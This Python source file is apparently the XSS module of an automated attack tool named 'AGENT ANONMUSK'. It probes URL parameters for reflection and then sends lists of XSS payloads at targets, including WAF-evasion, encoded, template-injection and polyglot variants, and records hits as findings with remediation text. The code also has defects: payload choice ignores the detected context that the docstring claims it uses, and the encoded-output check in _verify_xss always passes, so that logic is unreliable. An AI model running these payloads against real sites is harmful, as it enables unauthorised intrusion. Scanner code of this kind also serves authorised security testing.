"""
AGENT ANONMUSK — XSS Engine
===========================
Reflected & Stored XSS detection with fragmented injection for WAF evasion.
"""

from __future__ import annotations

import logging
import re
import html
from typing import Optional
from urllib.parse import quote

from core.context import Evidence, Finding, Severity, VulnType
from modules.base import BaseModule
from utils.http_client import HTTPClient

logger = logging.getLogger("AGENT ANONMUSK.injection.xss")

# ── Payload Database ─────────────────────────────────────────

BASIC_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '<body onload=alert(1)>',
]

# Fragmented / WAF-evasion payloads
WAF_EVASION_PAYLOADS = [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<img src=x onerror="al\\x65rt(1)">',
    '<svg/onload=alert(1)>',
    '"><svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>',
    '<img src=x onerror=prompt(1)>',
    '"><details open ontoggle=alert(1)>',
    '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
    "'-alert`1`-'",
    '"><iframe srcdoc="<script>alert(1)</script>">',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    "{{constructor.constructor('alert(1)')()}}",  # Angular template injection
    "${alert(1)}",  # Template literal injection
]

# Polyglot payloads
POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0teleport//",
    '\'"--></style></script><svg/onload=+/"/+/onmouseover=1/+/[*/[]/+alert(1)//',
]

# Canary for reflection detection
CANARY = "xss7r4nd0m"


class XSSEngine(BaseModule):
    """
    XSS detection engine with context-aware payload selection
    and fragmented injection for WAF evasion.

    Flow:
    1. Inject canary to detect reflection points
    2. Determine injection context (HTML, attribute, JS, URL)
    3. Select context-appropriate payloads
    4. If WAF detected, use evasion payloads
    5. Verify reflection of payload in response
    """

    MODULE_NAME = "xss"

    async def run(self) -> None:
        self._log_start("Testing for XSS vulnerabilities...")

        target_urls = self._attack_params.get("target_urls", [])
        params_to_test = self._attack_params.get("parameters", [])

        if not target_urls:
            target_urls = [
                ep.url for ep in self.ctx.endpoints
                if ep.interesting and ep.params
            ]

        if not target_urls:
            self._log_complete("No endpoints with parameters to test")
            return

        max_payloads = self.config.get("attack", {}).get("max_payloads_per_param", 50)
        waf_evasion = self.config.get("attack", {}).get("waf_evasion", True)

        scan_config = self.config.get("scanning", {})
        async with HTTPClient(
            scope=self.scope,
            rate_limit=scan_config.get("rate_limit", 10),
            timeout=scan_config.get("request_timeout", 15),
        ) as client:
            for url in target_urls[:30]:  # Top 30 endpoints
                await self._test_endpoint(
                    client, url, params_to_test, max_payloads, waf_evasion
                )

        self._log_complete("XSS testing complete")

    async def _test_endpoint(
        self,
        client: HTTPClient,
        url: str,
        params_filter: list[str],
        max_payloads: int,
        waf_evasion: bool,
    ):
        """Test a single endpoint for XSS."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return

        for param_name in params:
            if params_filter and param_name not in params_filter:
                continue

            # Step 1: Canary injection — check if value reflects
            canary_url = self._inject_param(url, param_name, CANARY)
            try:
                resp, _ = await client.get(canary_url)
                if CANARY not in resp.text:
                    continue  # Not reflected, skip

                # Step 2: Determine context
                context = self._detect_context(resp.text, CANARY)
                logger.debug(
                    "Reflection found for '%s' at %s (context: %s)",
                    param_name, url, context,
                )

                # Step 3: Select payloads based on context and WAF
                payloads = self._select_payloads(context, waf_evasion)

                # Step 4: Test each payload
                for payload in payloads[:max_payloads]:
                    test_url = self._inject_param(url, param_name, payload)
                    try:
                        test_resp, evidence = await client.get(test_url)

                        if self._verify_xss(test_resp.text, payload):
                            finding = Finding(
                                title=f"Reflected XSS in '{param_name}' at {url}",
                                vuln_type=VulnType.XSS,
                                severity=Severity.MEDIUM,
                                description=(
                                    f"Cross-Site Scripting (XSS) detected. "
                                    f"The parameter '{param_name}' reflects user input "
                                    f"without proper sanitization.\n\n"
                                    f"Context: {context}\n"
                                    f"Payload: {payload}"
                                ),
                                evidence=[evidence],
                                confidence=0.9,
                                target_url=url,
                                parameter=param_name,
                                payload=payload,
                                remediation=(
                                    "1. Implement context-aware output encoding\n"
                                    "2. Use Content-Security-Policy headers\n"
                                    "3. Validate and sanitize all user input\n"
                                    "4. Use frameworks with auto-escaping (React, Vue)"
                                ),
                            )
                            self.ctx.add_finding(finding)
                            logger.warning(
                                "🎯 XSS found: %s (param: %s)",
                                url, param_name,
                            )
                            break  # One payload per param is enough

                    except Exception as e:
                        logger.debug("XSS test failed: %s", e)

            except Exception as e:
                logger.debug("Canary test failed for %s: %s", url, e)

    @staticmethod
    def _inject_param(url: str, param: str, value: str) -> str:
        """Replace a parameter value in a URL."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [value]

        # Rebuild with single values
        flat_params = {k: v[0] for k, v in params.items()}
        new_query = urlencode(flat_params, quote_via=quote)
        return urlunparse(parsed._replace(query=new_query))

    @staticmethod
    def _detect_context(body: str, canary: str) -> str:
        """Detect the injection context of the canary in the response."""
        idx = body.find(canary)
        if idx == -1:
            return "unknown"

        # Look at surrounding characters
        before = body[max(0, idx - 50):idx]
        after = body[idx + len(canary):idx + len(canary) + 50]

        if re.search(r'<script[^>]*>.*$', before, re.DOTALL):
            return "js_string"
        if re.search(r'="[^"]*$', before) or re.search(r"='[^']*$", before):
            return "html_attribute"
        if re.search(r'<[a-zA-Z][^>]*$', before):
            return "html_tag"
        if "url(" in before.lower() or "href" in before.lower():
            return "url_context"

        return "html_body"

    @staticmethod
    def _select_payloads(context: str, waf_evasion: bool) -> list[str]:
        """Select payloads appropriate for the injection context."""
        payloads = list(BASIC_PAYLOADS)

        if waf_evasion:
            payloads.extend(WAF_EVASION_PAYLOADS)

        payloads.extend(POLYGLOT_PAYLOADS)
        return payloads

    @staticmethod
    def _verify_xss(body: str, payload: str) -> bool:
        """Verify if the payload rendered unescaped in the response."""
        # Check if exact payload appears (unencoded)
        if payload in body:
            # Make sure it's not HTML-encoded
            encoded = html.escape(payload)
            if encoded not in body or payload in body:
                return True
        return False
